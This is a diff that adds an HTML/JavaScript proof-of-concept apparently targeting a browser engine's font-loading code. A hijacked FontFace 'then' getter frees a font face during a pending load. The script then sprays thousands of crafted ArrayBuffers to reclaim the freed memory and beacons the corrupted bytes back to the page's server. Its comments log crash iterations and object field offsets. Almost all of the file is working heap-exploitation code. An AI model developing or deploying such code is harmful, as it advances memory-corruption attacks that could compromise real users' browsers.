@@ -1,0 +1,120 @@
+<!--
+  p588d v8b: COMPLETE ENGINE WRITE MAP (fixed)
+
+  v8 crashed: 0xAA at +0x58 → addClient read non-null table → deref crash.
+  Fix: zero out critical fields (+0x58..+0x6F), fill rest with 0xAA.
+  Set +0x82=0 (Pending) — if setStatus(Success) runs, it changes to 3.
+
+  At 60ms: dump all modified bytes. If +0x82 changed from 0 → setStatus ran
+  → iterateClients already executed during trap continuation.
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p588d</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+
+function main(){
+b('G');
+var gPa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(gPa);void gPa.loaded;
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+document.getElementById('v').remove();
+try{document.fonts.delete(this);}catch(e){}
+document.body.offsetHeight;
+b('F');
+var lane=[];
+for(var i=0;i<2048;i++){
+  var buf=new ArrayBuffer(192);
+  var v=new Uint8Array(buf);
+  // Fill ALL bytes with 0xAA
+  for(var k=0;k<192;k++)v[k]=0xAA;
+  // Critical fields that must be valid:
+  // +0x00..+0x03: rc=2
+  v[0]=2;v[1]=0;v[2]=0;v[3]=0;
+  // +0x04..+0x07: keep 0xAA (test if engine reads these)
+  // +0x58..+0x6F: zero (m_clients hash table area — null = fresh alloc)
+  for(var k=0x58;k<0x70;k++)v[k]=0;
+  // +0x82: status=0 (Pending) — if setStatus(Success) runs, this becomes 3
+  v[0x82]=0;
+  lane.push(v);
+}
+b('S'+lane.length);
+window._l=lane;
+return;},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+// 60ms: find hit lane and dump ALL modified bytes
+setTimeout(function(){
+  var lane=window._l;if(!lane)return;
+  var hi=-1;
+  for(var i=0;i<lane.length;i++){
+    var v=lane[i];
+    // Hit: rc changed from 2
+    if(v[0]!==2||v[1]!==0||v[2]!==0||v[3]!==0){hi=i;break;}
+    // Or: +0x58..+0x5F got written (non-zero)
+    for(var k=0x58;k<0x60;k++){if(v[k]!==0){hi=i;break;}}
+    if(hi>=0)break;
+  }
+  if(hi<0){b('AMISS');return;}
+  var v=lane[hi];
+  b('HIT='+hi+',rc='+rD(v,0));
+
+  // Build expected pattern for comparison
+  // +0x00..+0x03: was 2,0,0,0
+  // +0x04..+0x57: was 0xAA
+  // +0x58..+0x6F: was 0
+  // +0x70..+0x81: was 0xAA
+  // +0x82: was 0
+  // +0x83..+0xBF: was 0xAA
+  var mods='';
+  var cnt=0;
+  for(var off=0;off<192;off++){
+    var exp;
+    if(off<4)exp=[2,0,0,0][off];
+    else if(off>=0x58&&off<0x70)exp=0;
+    else if(off===0x82)exp=0;
+    else exp=0xAA;
+    if(v[off]!==exp){
+      if(cnt<50)mods+='+'+off.toString(16)+'='+('0'+v[off].toString(16)).slice(-2)+' ';
+      cnt++;
+    }
+  }
+  b('MODS('+cnt+'):'+mods);
+
+  // Key qwords
+  b('Q00='+rQ(v,0x00));
+  b('Q04='+rQ(v,0x04));
+  b('Q08='+rQ(v,0x08));
+  b('Q10='+rQ(v,0x10));
+  b('Q18='+rQ(v,0x18));
+  b('Q20='+rQ(v,0x20));
+  b('Q28='+rQ(v,0x28));
+  b('Q30='+rQ(v,0x30));
+  b('Q38='+rQ(v,0x38));
+  b('Q40='+rQ(v,0x40));
+  b('Q48='+rQ(v,0x48));
+  b('Q50='+rQ(v,0x50));
+  b('Q58='+rQ(v,0x58));
+  b('Q60='+rQ(v,0x60));
+  b('Q68='+rQ(v,0x68));
+  b('Q70='+rQ(v,0x70));
+  b('Q78='+rQ(v,0x78));
+  b('Q80='+rQ(v,0x80));
+  b('Q88='+rQ(v,0x88));
+
+  // STATUS CHECK — the money shot
+  b('STATUS_82='+v[0x82]+' (was 0, 3=setStatus ran)');
+},60);
+
+setTimeout(function(){b('ALIVE');},300);
+setTimeout(function(){b('ALIVE2');},3000);
+}
+setTimeout(main,0);
+</script></head><body>p588d</body></html>
